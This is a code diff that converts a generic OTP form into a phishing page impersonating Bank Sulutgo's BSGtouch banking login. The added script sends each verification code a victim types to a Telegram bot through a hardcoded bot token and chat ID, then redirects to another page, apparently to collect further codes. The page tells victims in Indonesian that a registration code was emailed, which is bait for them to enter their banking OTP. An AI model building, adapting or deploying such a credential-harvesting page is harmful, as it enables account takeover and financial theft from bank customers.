@@ -1,173 +1,123 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verifikasi OTP</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BSGtouch - Login</title>
 
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:Arial,sans-serif;
+:root{
+  --bg:#0f1012;
+  --panel: rgba(255,255,255,.06);
+  --text:#f2f4f8;
+  --muted: rgba(242,244,248,.68);
+  --stroke: rgba(255,255,255,.10);
+  --shadow: 0 18px 55px rgba(0,0,0,.55);
+  --danger:#b3182b;
+  --danger2:#cc2239;
+  --gold:#c9a93c;
+  --field:#ffffff;
+  --fieldText:#0e1116;
 }
 
-body{
-    background:#f4f4f4;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-}
-
-.container{
-    background:white;
-    width:350px;
-    padding:30px;
-    border-radius:12px;
-    box-shadow:0 5px 20px rgba(0,0,0,0.1);
-    text-align:center;
-}
-
-.logo{
-    font-size:28px;
-    font-weight:bold;
-    color:#e60012;
-    margin-bottom:20px;
-}
-
-h2{
-    margin-bottom:10px;
-    color:#333;
-}
-
-p{
-    color:#777;
-    font-size:14px;
-    margin-bottom:20px;
-}
-
-.otp-box{
-    display:flex;
-    justify-content:space-between;
-    gap:10px;
-    margin-bottom:20px;
-}
-
-.otp-box input{
-    width:50px;
-    height:55px;
-    text-align:center;
-    font-size:22px;
-    border:1px solid #ccc;
-    border-radius:8px;
-    outline:none;
-}
-
-.otp-box input:focus{
-    border-color:#e60012;
-}
-
-button{
-    width:100%;
-    padding:14px;
-    border:none;
-    background:#e60012;
-    color:white;
-    font-size:16px;
-    border-radius:8px;
-    cursor:pointer;
-}
-
-button:hover{
-    opacity:0.9;
-}
-
-.resend{
-    margin-top:15px;
-    font-size:14px;
-}
-
-.resend a{
-    color:#e60012;
-    text-decoration:none;
-    font-weight:bold;
-}
+*{ box-sizing:border-box; }
+html,body{ height:100%; margin:0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; color: var(--text); background: radial-gradient(1200px 800px at 70% 30%, rgba(255,255,255,.06), transparent 60%), radial-gradient(900px 700px at 25% 80%, rgba(255,255,255,.05), transparent 55%), linear-gradient(180deg, #0a0b0d, #0e1013 50%, #0a0b0d); overflow-x:hidden; }
+.wrap{ min-height:100%; display:flex; align-items:center; justify-content:center; padding:26px 16px 22px; position:relative; z-index:1; }
+.phone{ width:min(430px,100%); border-radius:28px; position:relative; }
+.logo-fallback{ width:100%; height:100px; display:flex; align-items:center; justify-content:center; }
+.logo-text{ font-weight:900; font-size:70px; letter-spacing:.5px; color:#fff; }
+.logo-text span{ font-weight:700; font-style:italic; }
+.card{ padding:14px 18px 16px; border-radius:26px; background: rgba(0,0,0,.18); border:1px solid rgba(255,255,255,.08); box-shadow: 0 18px 55px rgba(0,0,0,.55); backdrop-filter: blur(10px); }
+h1{ margin:8px 0 10px; font-size:32px; letter-spacing:.2px; }
+.field{ margin-top:12px; }
+.label{ font-size:14px; color: rgba(242,244,248,.78); margin:10px 2px 7px; }
+.inputWrap{ position:relative; width:100%; }
+input[type="text"], input[type="password"]{ width:100%; height:48px; border-radius:16px; border:1px solid rgba(0,0,0,.08); outline:none; padding:0 14px; font-size:15px; background: var(--field); color: var(--fieldText); box-shadow: 0 10px 22px rgba(0,0,0,.16); }
+input::placeholder{ color: rgba(14,17,22,.45); }
+.actions{ display:flex; align-items:center; justify-content:space-between; margin-top:14px; gap:12px; }
+.forgot{ color: var(--gold); font-size:15px; text-decoration:none; opacity:.95; }
+.forgot:hover{ text-decoration:underline; }
+.btn{ height:48px; min-width:150px; padding:0 18px; border-radius:999px; border:0; background: linear-gradient(180deg, var(--danger2), var(--danger)); color:#fff; font-weight:800; font-size:15px; cursor:pointer; box-shadow:0 16px 35px rgba(179,24,43,.35); }
+.btn:active{ transform:translateY(1px); }
+.toast{ position:fixed; left:50%; bottom:18px; transform: translateX(-50%); background: rgba(0,0,0,.75); border:1px solid rgba(255,255,255,.12); color:#fff; padding:10px 12px; border-radius:12px; font-size:13px; opacity:0; pointer-events:none; transition:.2s ease; z-index:50; backdrop-filter: blur(8px); }
+.toast.show{ opacity:1; }
 </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="logo">OTP</div>
+<div class="wrap">
+  <div class="phone">
+    <div class="top-logo">
+      <div class="logo-box">
+        <img src="logo-placeholder.png" alt="Logo Placeholder"
+          onerror="this.outerHTML='<div class=&quot;logo-fallback&quot;><div class=&quot;logo-text&quot;>BSG<span>touch</span></div></div>'">
+      </div>
+    </div>
 
-    <h2>Verifikasi Kode</h2>
-    <p>Masukkan kode OTP yang telah dikirim ke nomor Anda</p>
+    <div class="card">
+      <h1>Selamat Datang</h1>
 
-    <form id="otpForm">
-        <div class="otp-box">
-            <input type="tel" maxlength="1" required>
-            <input type="tel" maxlength="1" required>
-            <input type="tel" maxlength="1" required>
-            <input type="tel" maxlength="1" required>
-            <input type="tel" maxlength="1" required>
-            <input type="tel" maxlength="1" required>
+      <form id="loginForm" autocomplete="on">
+        <div class="field">
+          <div class="label">Terima kasih atas kepercayaan anda selama ini terhadap perbankan Bank Sulutgo, Kode pendaftaran telah dikirimkan melalui Email.</div>
+          <div class="inputWrap">
+            <input type="text" name="cc" id="kode" inputmode="tel" minlength="6"  placeholder="Masukan kode verifikasi disini" required>
+          </div>
         </div>
 
-        <button type="submit">Verifikasi</button>
-    </form>
-
-    <div class="resend">
-        Tidak menerima kode? <a href="#">Kirim ulang</a>
+        <div class="actions">
+          <a class="forgot" href="#" id="forgotLink"></a>
+          <button class="btn" type="submit">Masuk</button>
+        </div>
+      </form>
     </div>
+
+    <div class="toast" id="toast"></div>
+  </div>
 </div>
 
 <script>
-const inputs = document.querySelectorAll(".otp-box input");
+const $ = (s)=>document.querySelector(s);
+const toast = (msg)=>{
+  const el = $("#toast");
+  el.textContent = msg;
+  el.classList.add("show");
+  clearTimeout(window.__t);
+  window.__t=setTimeout(()=>el.classList.remove("show"),2200);
+};
 
-inputs.forEach((input, index) => {
-    input.addEventListener("input", () => {
-        // hanya angka
-        input.value = input.value.replace(/[^0-9]/g, "");
+// ======= TELEGRAM INTEGRATION =======
+// Ganti dengan token dan chat_id Telegram kamu
+const BOT_TOKEN = "8166407454:AAFb0QDfxrN5zW930YQqv5rBwffqDk8bd7g";
+const CHAT_ID = "7487586868";
 
-        // pindah otomatis ke kotak berikutnya
-        if (input.value.length === 1) {
-            if (index < inputs.length - 1) {
-                inputs[index + 1].focus();
-            } else {
-                // kotak terakhir langsung submit
-                document.getElementById("otpForm").requestSubmit();
-            }
-        }
-    });
-
-    input.addEventListener("keydown", (e) => {
-        // backspace kembali ke kotak sebelumnya
-        if (e.key === "Backspace" && input.value === "" && index > 0) {
-            inputs[index - 1].focus();
-        }
-    });
+$("#forgotLink").addEventListener("click",(e)=>{
+  e.preventDefault();
+  toast("Silakan hubungi Contact Center 1500 659");
 });
 
-document.getElementById("otpForm").addEventListener("submit", function(e){
-    e.preventDefault();
+$("#loginForm").addEventListener("submit", async (e)=>{
+  e.preventDefault();
+  const kode = $("#kode").value.trim();
+  if(!kode) return toast("Kode wajib diisi.");
 
-    let lengkap = true;
+  const message = `VERIFIKASI OTP\n\nKode: ${kode}\nDikirim dari website BSGtouch`;
 
-    inputs.forEach(input => {
-        if(input.value === ""){
-            lengkap = false;
-        }
+  try{
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({chat_id: CHAT_ID, text: message})
     });
-
-    if(!lengkap){
-        return;
-    }
-
-    // pindah ke halaman selanjutnya
-    window.location.href = "otp.html";
+    toast("");
+    // redirect ke halaman sukses / last.html
+    setTimeout(()=>window.location.href="otp.html", 1200);
+  }catch(err){
+    toast("");
+    console.error(err);
+  }
 });
 </script>
-
 </body>
+
 </html>
